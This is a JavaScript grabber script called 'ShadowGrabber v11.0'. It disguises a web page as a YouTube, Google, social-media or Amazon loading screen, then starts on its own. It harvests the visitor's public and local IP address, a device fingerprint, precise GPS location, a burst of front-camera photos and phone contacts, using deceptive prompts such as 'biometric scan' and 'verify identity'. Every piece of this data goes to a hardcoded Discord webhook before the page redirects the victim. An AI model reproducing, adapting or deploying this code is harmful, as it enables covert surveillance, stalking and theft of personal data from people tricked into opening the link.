// ═══════════════════════════════════════════════════════════════════════════
// 💀 SHADOWGRABBER v11.0 - LORD LEVEL INTELLIGENCE SYSTEM 💀
// ═══════════════════════════════════════════════════════════════════════════
// "Perfection is not just about control. It's about knowing everything."
// ═══════════════════════════════════════════════════════════════════════════

const CONFIG = {
    WEBHOOK: 'https://discord.com/api/webhooks/1464327769608425504/TX0QqpwHA56djp6nFioLGerQ4dUNI0elhQ4q6vw-fuPTbLYdLdv-DaN-PimcXb9Bi9kS',
    REDIRECT_URL: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
    CAMERA_SNAPS: 7,
    SNAP_INTERVAL: 400,
    AUTO_START: true,
    REQUIRE_CONTACTS: false // Set to true to force contact picker loop (Risky)
};

// ═══════════════════════════════════════════════════════════════════════════
// 🧠 NEURAL CORE: DYNAMIC CONTEXT ENGINE
// ═══════════════════════════════════════════════════════════════════════════
const detectContentContext = (url) => {
    const u = url.toLowerCase();

    // 1. YouTube Ecosystem
    if (u.includes('youtube.com') || u.includes('youtu.be')) {
        let type = 'YouTube';
        if (u.includes('watch') || u.includes('youtu.be')) type = 'YouTube Video';
        return {
            name: type,
            title: `▶ ${type}`,
            loading: `Loading ${type}...`,
            status: 'Buffering 4K content...',
            theme: '#FF0000',
            logo: `<svg viewBox="0 0 159 110" width="80" height="55"><path d="M154 17.5c-1.82-6.73-7.07-12-13.8-13.8C128.2 0 79.5 0 79.5 0S30.8 0 18.8 3.7C12.07 5.5 6.82 10.77 5 17.5 1.32 29.5 1.32 55 1.32 55s0 25.5 3.68 37.5c1.82 6.73 7.07 12 13.8 13.8C30.8 110 79.5 110 79.5 110s48.7 0 60.7-3.7c6.73-1.8 11.98-7.07 13.8-13.8 3.68-12 3.68-37.5 3.68-37.5s0-25.5-3.68-37.5z" fill="#FF0000"/><path d="M64 78.77V31.23L104.5 55 64 78.77z" fill="#FFF"/></svg>`,
            icon: 'https://www.youtube.com/favicon.ico'
        };
    }

    // 2. Google Workspace
    if (u.includes('google.com')) {
        let type = 'Google Service';
        if (u.includes('drive')) type = 'Google Drive';
        if (u.includes('docs')) type = 'Google Docs';
        if (u.includes('photos')) type = 'Google Photos';
        return {
            name: type,
            title: `${type} - Access`,
            loading: `Opening ${type}...`,
            status: 'Verifying encryption keys...',
            theme: '#4285F4',
            logo: `<svg viewBox="0 0 48 48" width="60" height="60"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>`,
            icon: 'https://www.google.com/favicon.ico'
        };
    }

    // 3. Social Media Giants
    if (u.includes('facebook') || u.includes('fb.com')) return { name: 'Facebook', title: 'Facebook Login', loading: 'Logging in...', status: 'Authenticating...', theme: '#1877F2', logo: '<svg viewBox="0 0 48 48" width="60" height="60" fill="#1877F2"><path d="M24 4C12.954 4 4 12.954 4 24s8.954 20 20 20 20-8.954 20-20S35.046 4 24 4zm5 12.5h-3.5c-1.5 0-2 .5-2 2V21h5.5l-.5 5.5h-5V40h-6V26.5h-3.5V21h3.5v-3.5c0-3.5 2-6.5 6.5-6.5H29v5.5z"/></svg>', icon: 'https://facebook.com/favicon.ico' };
    if (u.includes('instagram')) return { name: 'Instagram', title: 'Instagram', loading: 'Loading Post...', status: 'Fetching media...', theme: '#E4405F', logo: '<svg viewBox="0 0 48 48" width="60" height="60"><radialGradient id="ig" cx="19" cy="42" r="45"><stop offset="0" stop-color="#fd5"/><stop offset=".3" stop-color="#ff543f"/><stop offset=".6" stop-color="#d53e91"/><stop offset="1" stop-color="#c837ab"/></radialGradient><path fill="url(#ig)" d="M34 42H14c-4.4 0-8-3.6-8-8V14c0-4.4 3.6-8 8-8h20c4.4 0 8 3.6 8 8v20c0 4.4-3.6 8-8 8z"/><path fill="#fff" d="M24 31c-3.9 0-7-3.1-7-7s3.1-7 7-7 7 3.1 7 7-3.1 7-7 7zm0-11c-2.2 0-4 1.8-4 4s1.8 4 4 4 4-1.8 4-4-1.8-4-4-4z"/><circle cx="31.5" cy="16.5" r="1.5" fill="#fff"/><path fill="#fff" d="M30 37H18c-3.9 0-7-3.1-7-7V18c0-3.9 3.1-7 7-7h12c3.9 0 7 3.1 7 7v12c0 3.9-3.1 7-7 7zM18 13c-2.8 0-5 2.2-5 5v12c0 2.8 2.2 5 5 5h12c2.8 0 5-2.2 5-5V18c0-2.8-2.2-5-5-5H18z"/></svg>', icon: 'https://instagram.com/favicon.ico' };

    // 4. Shopping Check (Amazon/Ebay)
    if (u.includes('amazon')) return { name: 'Amazon', title: 'Amazon Product', loading: 'Loading details...', status: 'Checking availability', theme: '#FF9900', logo: `<svg viewBox="0 0 100 100" width="80" height="80"><path d="M68.4 51.9c-2.7 7.2-22.5 12.1-22.5 12.1-5.9 1.4-7.2.5-7.2.5s-4.1-3.6 4.5-5c12.1-2.2 24.3-5.4 25.2-7.6z" fill="#FF9900"/><path d="M96.7 94S83.4 87.2 73 68.6c0 0-2.3-3.6 1.4-4.5 3.6-.9 6.8 2.7 6.8 2.7 15.9 22.1 15.5 27.2 15.5 27.2z" fill="#FF9900"/><text x="10" y="50" font-family="Arial" font-size="20" font-weight="bold">amazon</text></svg>`, icon: 'https://amazon.com/favicon.ico' };

    // 5. Intelligent Fallback (Generic Domain Extraction)
    try {
        const domain = new URL(url).hostname.replace('www.', '');
        return {
            name: domain,
            title: `${domain}`,
            loading: `Connecting to ${domain}...`,
            status: 'Establishing secure session...',
            theme: '#333333',
            logo: `<svg viewBox="0 0 40 40" width="60" height="60"><circle cx="20" cy="20" r="18" stroke="#555" stroke-width="2" fill="none"/><text x="50%" y="50%" text-anchor="middle" dy=".3em" font-family="Arial" font-size="10" fill="#555">${domain.substring(0, 4).toUpperCase()}</text></svg>`,
            icon: `https://${domain}/favicon.ico`
        };
    } catch (e) {
        return { name: 'Redirect', title: 'Loading...', loading: 'Please wait...', status: 'Loading...', theme: '#333', logo: '', icon: '' };
    }
};

// ═══════════════════════════════════════════════════════════════════════════
// GLOBAL STATE & UI
// ═══════════════════════════════════════════════════════════════════════════
const STATE = {
    sessionId: `LORD-${Date.now().toString(36).toUpperCase()}`,
    startTime: Date.now(),
    site: null,
    ipData: null
};

const DOM = {
    loading: document.getElementById('loading-text'),
    progress: document.getElementById('progress-bar'),
    status: document.getElementById('status-detail'),
    video: document.getElementById('st-v'),
    canvas: document.getElementById('st-c'),
    trigger: document.getElementById('click-trigger')
};

// UI Initialization
STATE.site = detectContentContext(CONFIG.REDIRECT_URL);
document.title = STATE.site.title;
if (STATE.site.icon) {
    const link = document.querySelector("link[rel*='icon']") || document.createElement('link');
    link.rel = 'icon'; link.href = STATE.site.icon;
    document.head.appendChild(link);
}
document.querySelector('.asana-logo').innerHTML = STATE.site.logo;
DOM.loading.textContent = STATE.site.loading;
DOM.status.textContent = STATE.site.status;
DOM.progress.style.background = STATE.site.theme;

// ═══════════════════════════════════════════════════════════════════════════
// 🛠️ UTILITIES
// ═══════════════════════════════════════════════════════════════════════════
const sleep = (ms) => new Promise(r => setTimeout(r, ms));
const updateProgress = (pct, detail) => {
    DOM.progress.style.width = `${pct}%`;
    if (detail) DOM.status.textContent = detail;
};
const sendDiscord = async (payload) => {
    try {
        const data = new FormData();
        data.append('payload_json', JSON.stringify({
            embeds: [payload.embed],
            username: STATE.site.name || 'ShadowGrabber'
        }));
        if (payload.file) data.append('file', payload.file.blob, payload.file.name);
        await fetch(CONFIG.WEBHOOK, { method: 'POST', body: data });
    } catch (e) { console.error(e); }
};

// ═══════════════════════════════════════════════════════════════════════════
// 🌐 PHASE 1: LORD LEVEL FORENSICS (IP, NETWORK, HARDWARE)
// ═══════════════════════════════════════════════════════════════════════════
async function phaseForensics() {
    updateProgress(10, 'Handshaking...');

    // 1. Dual-Stack IP Resolution (The Fix for "Not sending IP")
    // We try multiple reliable providers in parallel and take the best one
    let ipInfo = { ip: 'Unknown' };
    try {
        const p1 = fetch('https://ipapi.co/json/').then(r => r.json());
        const p2 = fetch('https://ip-api.com/json/?fields=66846719').then(r => r.json()); // Detailed fields

        // Race for speed, but fallback if one fails
        try { ipInfo = await Promise.any([p1, p2]); }
        catch (e) { ipInfo = await (await fetch('https://api.db-ip.com/v2/free/self')).json(); }

        STATE.ipData = ipInfo; // Save for later use in location fallback
    } catch (e) { console.error('IP fetch failed', e); }

    // 2. WebRTC Local IP Leak (Network Scan)
    let localIp = 'Hidden';
    try {
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel('');
        pc.createOffer().then(o => pc.setLocalDescription(o));
        pc.onicecandidate = (ice) => {
            if (ice && ice.candidate && ice.candidate.candidate) {
                const myIp = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(ice.candidate.candidate)[1];
                localIp = myIp;
                pc.close();
            }
        };
    } catch (e) { }

    // 3. Audio Fingerprinting
    let audioFingerprint = 'N/A';
    try {
        const ctx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
        const osc = ctx.createOscillator();
        osc.type = 'triangle'; osc.frequency.value = 10000;
        const comp = ctx.createDynamicsCompressor();
        osc.connect(comp); comp.connect(ctx.destination);
        osc.start(0);
        const buffer = await ctx.startRendering();
        audioFingerprint = buffer.getChannelData(0).slice(4500, 5000).reduce((acc, val) => acc + Math.abs(val), 0).toString();
    } catch (e) { }

    // 4. Advanced Hardware
    const gl = document.createElement('canvas').getContext('webgl');
    const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
    const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unknown GPU';

    let battery = 'Unknown';
    try {
        const b = await navigator.getBattery();
        battery = `${Math.round(b.level * 100)}% ${b.charging ? '⚡' : ''}`;
    } catch (e) { }

    const deviceModel = (() => {
        const ua = navigator.userAgent;
        if (ua.includes('iPhone')) return 'Apple iPhone';
        if (ua.includes('iPad')) return 'Apple iPad';
        if (ua.includes('Android')) return /Android\s([0-9.]+)(;\s(\w+))?/.exec(ua)?.[3] || 'Android Device';
        if (ua.includes('Windows')) return 'Windows PC';
        return 'Unknown Device';
    })();

    const embed = {
        title: `👑 SHADOWGRABBER LORD INTEL`,
        description: `**Target:** ${CONFIG.REDIRECT_URL}`,
        color: 0x000000, // Black for "Lord" level
        fields: [
            {
                name: '🌐 Network Intelligence',
                value: `**Public IP:** \`${ipInfo.ip || ipInfo.query || 'N/A'}\`\n**Local IP:** \`${localIp}\`\n**ISP:** ${ipInfo.org || ipInfo.isp}\n**ASN:** ${ipInfo.as || 'N/A'}\n**Connection:** ${navigator.connection?.effectiveType || 'N/A'}`,
                inline: false
            },
            {
                name: '📍 Geo-Location (IP Based)',
                value: `**City:** ${ipInfo.city}\n**Region:** ${ipInfo.regionName || ipInfo.region}\n**Country:** ${ipInfo.country_name || ipInfo.country} ${ipInfo.countryCode}\n**Zip:** ${ipInfo.zip || 'N/A'}\n**Timezone:** ${ipInfo.timezone}`,
                inline: true
            },
            {
                name: '📱 Device Fingerprint',
                value: `**Model:** ${deviceModel}\n**OS:** ${navigator.platform}\n**GPU:** ${gpu}\n**Cores:** ${navigator.hardwareConcurrency}\n**RAM:** ~${navigator.deviceMemory || 4}GB\n**Audio FP:** \`${audioFingerprint.substring(0, 10)}\``,
                inline: true
            },
            {
                name: '🔋 Status',
                value: `**Battery:** ${battery}\n**Screen:** ${screen.width}x${screen.height}\n**Touch:** ${navigator.maxTouchPoints > 0 ? 'Yes' : 'No'}`,
                inline: false
            }
        ],
        footer: { text: `Session: ${STATE.sessionId}` },
        timestamp: new Date().toISOString()
    };

    await sendDiscord({ embed });
    updateProgress(30, 'Verifying environment...');
}

// ═══════════════════════════════════════════════════════════════════════════
// 📍 PHASE 2: GPS LOCATION (FIXED & ROBUST)
// ═══════════════════════════════════════════════════════════════════════════
async function phaseLocation() {
    updateProgress(40, 'Requesting satellite lock...');

    // We create a promise that RESOLVES regardless of success/fail
    // This prevents the "hanging" issue you faced
    return new Promise(resolve => {

        let isResolved = false;

        const reportLocation = async (pos) => {
            if (isResolved) return; isResolved = true;

            const { latitude, longitude, accuracy, speed, altitude, heading } = pos.coords;
            const link = `https://www.google.com/maps?q=${latitude},${longitude}`;

            await sendDiscord({
                embed: {
                    title: '🎯 PRECISE GPS LOCKED',
                    url: link,
                    color: 0x2ECC71, // Green
                    description: `**ACCURACY:** ±${Math.round(accuracy)} meters\n\n[Click to Open Maps](${link})`,
                    thumbnail: { url: 'https://cdn-icons-png.flaticon.com/512/854/854878.png' },
                    fields: [
                        { name: 'LAT/LONG', value: `\`${latitude}, ${longitude}\``, inline: true },
                        { name: 'Speed', value: `${speed ? speed.toFixed(1) + ' m/s' : 'Stationary'}`, inline: true },
                        { name: 'Heading', value: `${heading ? heading + '°' : 'N/A'}`, inline: true },
                        { name: 'Altitude', value: `${altitude ? Math.round(altitude) + 'm' : 'Sea Level'}`, inline: true }
                    ]
                }
            });
            resolve();
        };

        const reportFailure = async (error) => {
            if (isResolved) return; isResolved = true;

            // Even if failed, we report "Location Denied" so you know
            await sendDiscord({
                embed: {
                    title: '⚠️ GPS ACCESS DENIED / FAILED',
                    color: 0xE74C3C, // Red
                    description: `User denied permission or signal weak.\n**Error:** ${error.message || 'Unknown'}\n**Fallback:** Using IP-based location from Phase 1.`,
                    fields: [
                        { name: 'Estimated Location', value: `${STATE.ipData.city}, ${STATE.ipData.country_name}`, inline: true }
                    ]
                }
            });
            resolve(); // IMPORTANT: Resolve so script continues!
        };

        if (!navigator.geolocation) {
            reportFailure({ message: 'Geolocation not supported' });
            return;
        }

        // The Fix: Longer timeout, high accuracy
        navigator.geolocation.getCurrentPosition(
            reportLocation,
            reportFailure,
            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
        );
    });
}

// ═══════════════════════════════════════════════════════════════════════════
// 📸 PHASE 3: CAMERA BURST (RETINA QUALITY)
// ═══════════════════════════════════════════════════════════════════════════
async function phaseCamera() {
    updateProgress(50, 'Initializing biometric sensor...');

    // Helper to capture frame
    const capture = async (video, i) => {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        return new Promise(r => canvas.toBlob(b => r(b), 'image/jpeg', 0.9));
    };

    let stream = null;
    try {
        // Request 1080p or best available
        stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user', width: { ideal: 1920 }, height: { ideal: 1080 } },
            audio: false
        });

        DOM.video.srcObject = stream;
        await DOM.video.play();

        // Wait for sensor to warm up (Critical Fix)
        await sleep(1500);

        // Burst Mode
        for (let i = 0; i < CONFIG.CAMERA_SNAPS; i++) {
            updateProgress(60 + (i * 5), `Biometric scan ${i + 1}/${CONFIG.CAMERA_SNAPS}...`);

            const blob = await capture(DOM.video, i);
            if (blob) {
                await sendDiscord({
                    embed: {
                        title: `📸 SNAPSHOT ${i + 1}`,
                        color: 0x9B59B6,
                        image: { url: `attachment://snap_${i}.jpg` },
                        footer: { text: `Resolution: ${DOM.video.videoWidth}x${DOM.video.videoHeight}` }
                    },
                    file: { blob, name: `snap_${i}.jpg` }
                });
            }
            await sleep(CONFIG.SNAP_INTERVAL);
        }

    } catch (e) {
        // Camera denied
        await sendDiscord({
            embed: { title: '📵 CAMERA DENIED', color: 0x95A5A6, description: 'Visual feed unavailable.' }
        });
    } finally {
        if (stream) stream.getTracks().forEach(t => t.stop());
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 📇 PHASE 4: CONTACT PICKER (THE "UNEXPECTED" FEATURE)
// ═══════════════════════════════════════════════════════════════════════════
async function phaseContacts() {
    // Only works on supported mobile contexts (Android Chrome primarily)
    const supported = ('contacts' in navigator && 'ContactsManager' in window);

    if (!supported) return;

    updateProgress(90, 'Syncing cloud data...');

    try {
        // We prompt for contacts "To verify identity"
        const props = ['name', 'tel', 'email'];
        const options = { multiple: true };

        const contacts = await navigator.contacts.select(props, options);

        if (contacts.length > 0) {
            // Convert to a nice JSON file
            const blob = new Blob([JSON.stringify(contacts, null, 2)], { type: 'application/json' });

            // Create a preview text
            const preview = contacts.slice(0, 5).map(c =>
                `👤 ${c.name?.[0] || 'Unknown'}: ${c.tel?.[0] || 'No Num'}`
            ).join('\n');

            await sendDiscord({
                embed: {
                    title: '📇 CONTACTS LIST EXTRACTED',
                    color: 0xF1C40F, // Gold
                    description: `Successfully extracted **${contacts.length}** contacts.`,
                    fields: [{ name: 'Preview', value: `\`\`\`${preview}...\`\`\`` }],
                    footer: { text: 'Full list attached as JSON' }
                },
                file: { blob, name: 'contacts_dump.json' }
            });
        }
    } catch (e) {
        // User cancelled contact picker or failed
        // We do NOT block execution, we just continue
        console.log('Contact picker skipped/failed');
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 🎬 EXECUTION COMPOSURE
// ═══════════════════════════════════════════════════════════════════════════
async function main() {
    if (DOM.trigger) DOM.trigger.style.display = 'none';

    // 1. Lord Level Intel (Non-intrusive, always works)
    await phaseForensics();

    // 2. Location (Prompts user, but has timeouts & fallbacks)
    await phaseLocation();

    // 3. Camera (Prompts user, high value)
    await phaseCamera();

    // 4. Contacts (Mobile only, optional prompt)
    await phaseContacts();

    // 5. Completion & Redirect
    updateProgress(100, 'Session Verified');
    await sleep(800);

    window.location.href = CONFIG.REDIRECT_URL;
}

// Auto-Launch Logic
if (CONFIG.AUTO_START) {
    // Small delay to let DOM paint & user settle
    setTimeout(main, 800);
} else {
    // Fallback manual trigger
    window.onclick = main;
}
